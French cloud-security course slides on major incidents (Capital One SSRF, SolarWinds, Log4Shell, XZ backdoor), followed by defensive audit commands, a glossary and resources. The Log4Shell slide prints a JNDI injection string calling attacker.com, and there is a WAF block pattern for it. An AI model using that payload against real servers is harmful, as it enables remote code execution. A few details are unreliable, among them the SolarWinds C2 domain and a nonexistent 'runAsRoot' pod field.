---
title: "16. Cas réels : incidents cloud majeurs"
---

# 16. Cas réels : incidents cloud majeurs

## 16. Cas réels :

incidents cloud majeurs

![Slide 377](/securite-cloud/16-cas-reels-incidents-cloud/p377_00_Image13.jpg)

## Exposition de Bucket S3 (Capital One 2019)

Données
exposées
106 millions de clients nord-américains · Numéros de sécurité sociale · Numéros de
comptes bancaires · Cotes de crédit
Vecteur
d’attaque
SSRF (Server-Side Request Forgery) sur un WAF mal configuré → accès au service IMDS
(169.254.169.254) → vol des credentials IAM de l’EC2
Cause
technique
Rôle IAM EC2 avec trop de permissions (accès S3 complet) + WAF ne bloquant pas les
requêtes SSRF vers 169.254.x.x
Impact
financier
Amende de 80M$ par l’OCC · Coût total estimé à 300M$ · Réputation endommagée · CISO
licencié
Remédiation Activer IMDSv2 obligatoire · IAM least privilege · WAF rules bloquant SSRF · S3 Block
Public Access org-level · GuardDuty + Macie
Autres cas
similaires
GoDaddy (2021, 1.2M clients) · Twitch (2021, code source) · Samsung (2022, données
clients) · Toyota (2022, 2M véhicules)

## © 2026, Loïc Rossignol, IAWS010

SolarWinds Suppl y Chain Attack (2020)
18 000 organisations infectées : Agences US gouvernementales, Microsoft, FireEye / Attribué : APT29 (Cozy Bear, SVR russe)
Chaîne de compromission Techniques d'attaque (MITRE ATT&CK)
- Oct 2019 : accès initial au build system SolarWinds Orion
- Oct-Nov 2019 : tests du backdoor sans payload (camouflage)
- Fév 2020 : injection du malware SUNBURST dans DLL
Orion.Core.BusinessLayer.dll
- Mars-Juin 2020 : 18 000 clients téléchargent la mise à jour infectée
(signée !)
- Juin-Déc 2020 : exploitation discrète des organisations cibles (APT
long terme)
- 13 Déc 2020 : découverte par FireEye qui enquête sur sa propre
compromission
- T1195.002 : Compromise Software Supply Chain (build pipeline)
- T1553.002 : Code Signing (DLL signée avec certificat légitime Orion)
- T1071.001 : C2 via HTTP/HTTPS (avoslocker.appsync-api.*.amazonaws.com)
- T1562 : Defense Evasion : dormance 14j après install, imite le trafic légitime
Orion
- T1550.001 : Token Impersonation : vol des tokens SAML Azure AD → accès
M365
- T1119 : Automated Collection : exfiltration de mails et fichiers ciblés
Leçons et contrôles anti-supply-chain
- SBOM obligatoire pour tous les logiciels tiers : aurait permis de détecter la modification de la DLL
- Signature et vérification de build : reproductible builds · Binary Transparency · Cosign/Sigstore pour les artefacts
- Isolation du build system : réseau séparé · pas d'accès Internet · MFA + PAM sur les serveurs de build
- Détection réseau : alertes sur connexions DNS vers domaines générés algorithmiquement (DGA) · UEBA sur comportement applicatif
- Principe du moindre privilège pour les tokens SAML : limiter la durée de vie et les scopes (évite le golden SAML attack)

## © 2026, Loïc Rossignol, IAWS010

Log4Shell CVE-2021-44228 (Décembre 2021)
CVSS 10.0 · RCE sans authentification · Affecté : Apple, Amazon, Google, Tesla, Minecraft, Twitter, etc. + de 100M instances vulnérables
Mécanisme de la vulnérabilité Détection et réponse
- Log4j2 interprète les expressions JNDI (${jndi:ldap://...}) dans les
chaînes loguées
- Un attaquant envoie ${jndi:ldap://attacker.com/exploit} dans un
champ logué (User-Agent, etc.)
- Log4j2 fait une requête LDAP vers le serveur attaquant
- Le serveur attaquant répond avec une classe Java malveillante
- Log4j2 charge et exécute cette classe → RCE complète sur le serveur
- Exploitation en <1 ligne · Détection initiale très difficile
- WAF : bloquer les patterns ${jndi: dans tous les inputs HTTP
- Network : bloquer les connexions LDAP/RMI sortantes non autorisées
- Scanner : log4j-detector (Lunasec) · log4shell-detector · Huntress Log4Shell
Tester
- Mitigation immédiate : LOG4J_FORMAT_MSG_NO_LOOKUPS=true (env var)
- Correction permanente : upgrader vers Log4j 2.17.1+
- SBOM : aurait permis de lister instantanément tous les services affectés
# Scanner toutes les images Docker pour Log4Shell
# Option 1 : Grype (Anchore)
grype sbom:./sbom.json | grep log4j
# Option 2 : Trivy
trivy fs --severity CRITICAL --vuln-type library .
trivy image myapp:latest | grep CVE-2021-44228
# Option 3 : log4j-detector (Lunasec)
java -jar log4j-detector.jar /opt/myapp /var/lib
# Dans la CI/CD (GitHub Actions) :
- uses: anchore/scan-action@v3
  with: { image: "myapp:latest", fail-build: "true", severity-cutoff: "critical" }
un SBOM aurait permis de répondre à 'quels services utilisent
Log4j ?' en quelques secondes vs. jours d'investigation

## © 2026, Loïc Rossignol, IAWS010

XZ Utils Backdoor : Social Engineering Avancé (Avril 2024)
Backdoor dans xz/liblzma (dépendance SSH sur Debian/Ubuntu/Fedora) · Découverte par hasard par un développeur Microsoft via un benchmark CPU
Timeline de l'attaque (+ 2ans de préparation) Mécanisme technique du backdoor
- Juin 2021 : création du compte GitHub 'JiaT75' (fausse identité
soigneusement construite)
- 2022-2023 : contributions légitimes de qualité au projet xz pour gagner la
confiance du mainteneur
- Fin 2023 : harcèlement coordonné du mainteneur principal (burn-out
orchestré) pour forcer une prise en charge
- Jan-Fév 2024 : injection du backdoor dans les versions 5.6.0 et 5.6.1 de
xz/liblzma
- Mars 2024 : Andres Freund (Microsoft) remarque une anomalie de 500ms
dans SSH via un benchmark perf → découverte
- 5 Avril 2024 : CVE-2024-3094 publiée (CVSS 10.0) : urgence nationale aux US
- Le backdoor est injecté uniquement dans les tarballs de release (pas
dans Git directement)
- Il cible spécifiquement sshd via la chaîne : xz → liblzma → systemd →
sshd
- Objectif : permettre à l'attaquant de s'authentifier SSH sans credentials
valides
- Détection ratée par : checksum du tarball valide (le code est dans les
tests !) · CI/CD ne scannait que Git
- Impact potentiel : accès root sur des millions de serveurs Linux
mondiaux
Leçons pour les équipes DevSecOps
- Reproduire les builds (reproducible builds)
- Comparer le tarball au source Git / Scanner les tarballs et les sources
- Vérifier l'intégrité des dépendances open source
- Revues de code humaines sur les contributions critiques
- SBOM avec sources vérifiées
- Alertes sur changements de mainteneurs de projets critiques

## © 2026, Loïc Rossignol, IAWS010

Sécurité de la CLI AWS
IAM : Audit et investigation S3 : Sécurité des buckets
aws iam generate-credential-report && aws iam
get-credential-report | base64 -d
aws iam list-users --query 'Users[?PasswordLastUsed==`null`]'  #
users jamais connectés
aws iam list-access-keys --user-name USERNAME  # lister les clés
d'un user
aws iam simulate-principal-policy --policy-source-arn ARN
--action-names 's3:*'  # tester permissions
aws s3api get-bucket-acl --bucket BUCKET  # vérifier les ACLs
aws s3api get-public-access-block --bucket BUCKET  # état Block
Public Access
aws s3api put-public-access-block --bucket BUCKET
--public-access-block-configuration
'BlockPublicAcls=true,BlockPublicPolicy=true,IgnorePublicAcls=true,
RestrictPublicBuckets=true'
aws s3api get-bucket-encryption --bucket BUCKET  # vérifier le
chiffrement
GuardDuty : Findings CloudTrail : Logs forensiques
aws guardduty list-findings --detector-id ID  # lister tous les
findings
aws guardduty get-findings --detector-id ID --finding-ids ID1
ID2  # détail
aws guardduty create-sample-findings --detector-id ID  # générer
des findings de test
aws guardduty list-detectors  # trouver l'ID du détecteur
- aws cloudtrail lookup-events --lookup-attributes
AttributeKey=Username,AttributeValue=root  # events root
- aws cloudtrail lookup-events --start-time 2024-01-01 --query
'Events[?EventName==`ConsoleLogin`]'
- aws cloudtrail get-trail-status --name TRAIL_NAME  #
vérifier si actif
- aws logs filter-log-events --log-group-name CloudTrail/logs
--filter-pattern 'errorCode'

## © 2026, Loïc Rossignol, IAWS010

Sécurité de kubernetes
RBAC : Audit des droits Pods : Détection de mauvaises configs
kubectl auth can-i --list
--as=system:serviceaccount:default:mysa  # ce que le SA peut
faire
kubectl get rolebindings,clusterrolebindings --all-namespaces -o
wide | grep -v system:
kubectl get pods --all-namespaces -o json | jq
'.items[].spec.serviceAccountName'  # SA par pod
kubectl describe clusterrolebinding cluster-admin  # qui a les
droits admin ?
kubectl get pods --all-namespaces -o json | jq '.items[] |
select(.spec.securityContext.runAsRoot==true)'
kubectl get pods -o json | jq '.items[] |
select(.spec.hostNetwork==true)' # pods avec hostNetwork
kubectl get pods -o json | jq '.items[] |
select(.spec.containers[].securityContext.privileged==true)'
kubectl get secrets --all-namespaces | grep -v kubernetes.io  #
secrets custom
GuardDuty : Findings Falco : Détection runtime
kubectl get networkpolicies --all-namespaces  # lister toutes
les network policies
kubectl describe networkpolicy default-deny -n production  #
détail d'une policy
# Namespaces sans network policy (dangereux) :
for ns in $(kubectl get ns -o
jsonpath='{.items[*].metadata.name}'); do echo $ns: $(kubectl
get networkpolicy -n $ns 2>/dev/null | wc -l) policies; done
helm install falco falcosecurity/falco -n falco --create-namespace
# installation
kubectl logs -l app=falco -n falco --tail=50 -f  # suivre les
alertes
kubectl exec -it falco-pod -n falco -- falco --list | grep shell  #
règles disponibles
# Test : spawner un shell dans un pod (doit déclencher Falco) :
kubectl exec -it mypod -- /bin/bash  # → alerte Falco dans les logs

## © 2026, Loïc Rossignol, IAWS010

sécurité terraform et iac
tfsec : Scanner Terraform Checkov : Multi-IaC Scanner
tfsec . --minimum-severity HIGH  # scan sécurité du répertoire
courant
tfsec . --format sarif > results.sarif  # output GitHub Security
tfsec . --include-ignored --soft-fail  # voir aussi les ignores
tfsec . --custom-check-dir ./custom-rules  # règles
personnalisées
checkov -d . --framework terraform  # scanner Terraform
checkov -f Dockerfile --framework dockerfile  # scanner Dockerfile
checkov -d . --check CKV_AWS_21,CKV_AWS_57  # checks spécifiques
seulement
checkov -d . --output sarif --output-file results.sarif  # pour
GitHub
Conftest : Policy as Code Trivy : Scan Images + IaC
conftest test main.tf --policy ./policies  # valider un fichier
Terraform
conftest test deployment.yaml --policy ./k8s-policies  # valider
K8s YAML
conftest verify --policy ./policies  # vérifier les tests de
policies
# Exemple politique Rego : interdire buckets S3 non chiffrés
trivy image myapp:latest --severity HIGH,CRITICAL  # scan image
Docker
trivy fs . --scanners secret  # détecter les secrets dans le code
trivy config . --severity HIGH  # scan IaC (Terraform, K8s,
Dockerfile)
trivy sbom --format cyclonedx myapp:latest > sbom.json  # générer
SBOM

## © 2026, Loïc Rossignol, IAWS010

DE A à F : Termes et Acronymes Essentiels
ABAC Attribute-Based Access Control : contrôle d’accès basé sur les
attributs contextuels (user, device, time, location) CVE Common Vulnerabilities and Exposures : identifiant unique d’une
vulnérabilité (ex : CVE-2021-44228 = Log4Shell)
ACL Access Control List : liste de règles allow/deny sur une ressource (ex
: S3 bucket ACL, Network ACL) CWPP Cloud Workload Protection Platform : protection runtime des VM,
containers et fonctions serverless
APT Advanced Persistent Threat : groupe d’attaquants sophistiqués,
souvent étatiques, avec objectifs à long terme DevSecOps Intégration de la sécurité dans le cycle DevOps (Shift-Left Security/
Security as Code)
BYOK Bring Your Own Key : modèle où le client génère et importe sa
propre clé maîtresse dans le KMS du provider DLP Data Loss Prevention : solution détectant et bloquant les fuites de
données sensibles (PII, secrets, données financières)
CASB Cloud Access Security Broker : solution de sécurité entre
utilisateurs et services cloud (Shadow IT, DLP , threat protection) DSPM Data Security Posture Management : découverte, classification et
protection des données sensibles dans le cloud
CIEM Cloud Infrastructure Entitlement Management : gestion des droits
et permissions excessifs dans les environnements cloud eBPF Extended Berkeley Packet Filter : technologie Linux permettant
d’exécuter du code dans le kernel sans module (utilisé par Falco)
CNAPP Cloud-Native Application Protection Platform : plateforme intégrant
CSPM + CWPP + CIEM + KSPM + DSPM EDR Endpoint Detection & Response : solution de sécurité endpoint avec
détection comportementale et réponse automatisée
CSPM Cloud Security Posture Management : surveillance continue de la
configuration des ressources cloud vs. référentiels FaaS Function as a Service : modèle serverless où le code s’exécute à la
demande sans gestion de serveur (Lambda, Functions)

## © 2026, Loïc Rossignol, IAWS010

DE G à Z : Termes et Acronymes Essentiels (suite)
HSM Hardware Security Module : module matériel dédié à la
protection des clés cryptographiques (FIPS 140-2 L3) MFA Multi-Factor Authentication : authentification
multi-facteurs : something you know + have + are
IaC Infrastructure as Code : gestion de l'infrastructure via du
code (Terraform, CloudFormation, Ansible, Pulumi)
MITRE
ATT&CK
Knowledge base des tactiques, techniques et procédures
(TTPs) d’attaque observées en conditions réelles
IAM Identity & Access Management : gestion des identités et des
droits d'accès aux ressources cloud mTLS Mutual TLS : authentification bidirectionnelle TLS où
client ET serveur présentent leur certificat
IdP
Identity Provider : fournisseur d’identité (Okta, Azure AD,
Ping) émettant des assertions SAML ou tokens OIDC OIDC
OpenID Connect : couche d’identité sur OAuth 2.0
utilisant des tokens JWT (standard pour CI/CD
federation)
JIT
Just-In-Time : accès privilégié activé temporairement pour
une durée limitée avec approbation (Azure PIM, AWS SSO) PAM
Privileged Access Management : gestion des accès
privilégiés avec enregistrement, approbation et durée
limitée
KMS Key Management Service : service de gestion des clés de
chiffrement (AWS KMS, Azure Key Vault, Cloud KMS) RBAC Role-Based Access Control — contrôle d'accès basé sur
les rôles attribués aux utilisateurs

## © 2026, Loïc Rossignol, IAWS010

DE G à Z : Termes et Acronymes Essentiels
SBOM
Software Bill of Materials : inventaire exhaustif des
composants logiciels (format SPDX ou CycloneDX) STS
Security Token Service (AWS) : service émettant des
credentials temporaires via AssumeRole / OIDC /
SAML
SIEM
Security Information & Event Management :
centralisation, normalisation, corrélation des logs
et alertes sécurité
UEBA
User & Entity Behavior Analytics : détection
d’anomalies comportementales par ML pour
utilisateurs et systèmes
SOAR
Security Orchestration, Automation & Response :
automatisation des workflows de réponse aux
incidents sécurité
VPC
Virtual Private Cloud : réseau virtuel isolé dans le
cloud provider (AWS VPC, Azure VNet, GCP VPC)
SOC
Security Operations Center : équipe dédiée à la
surveillance, détection et réponse aux incidents
24/7
ZTNA Zero Trust Network Access : accès réseau basé sur
l’identité et le contexte, remplace le VPN traditionnel
SSRF
Server-Side Request Forgery : vulnérabilité
permettant de forger des requêtes depuis le
serveur (ex : vers IMDS)

## © 2026, Loïc Rossignol, IAWS010

Ressources pour aller plus loin
- Standards & frameworks
  - https://attack.mitre.org : MITRE ATT&CK for Cloud (tactiques + techniques + navigator)
  - https://owasp.org/Top10/2025 : OWASP Cloud Security Top 10
  - https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP .800-207.pdf : NIST Zero Trust Architecture
  - https://cloudsecurityalliance.org/artifacts/cloud-controls-matrix-v4-1 : CSA CCM v4
- Formation & certifications
  - https://www.aws.training/ : AWS Security Learning Path (gratuit)
  - https://learn.microsoft.com/fr-fr/credentials/certifications/resources/study-guides/sc-200 : Préparation de la
certification Microsoft SC-200
  - https://www.coursera.org/specializations/ccsp-exam-prep : Préparation de la certification CCSP (ISC²)
  - https://tryhackme.com/path/outline/soclevel1 : SOC niveau 1
  -  https://portswigger.net/web-security/all-labs : Web Security Academy
- Veille sécurité cloud
  - https://www.sysdig.com/blog : blog de la société Sysdig
  - https://www.wiz.io/blog : CNAPP & menaces cloud
  - https://cloudsecurityalliance.org : Recherche CSA
  - https://krebsonsecurity.com : Actualités sécurité
  - https://therecord.media : Actualités sécurité

## La sécurité n'est pas un état à atteindre,

c'est une pratique à maintenir.

![Slide 391](/securite-cloud/16-cas-reels-incidents-cloud/p391_01_Image13.jpg)
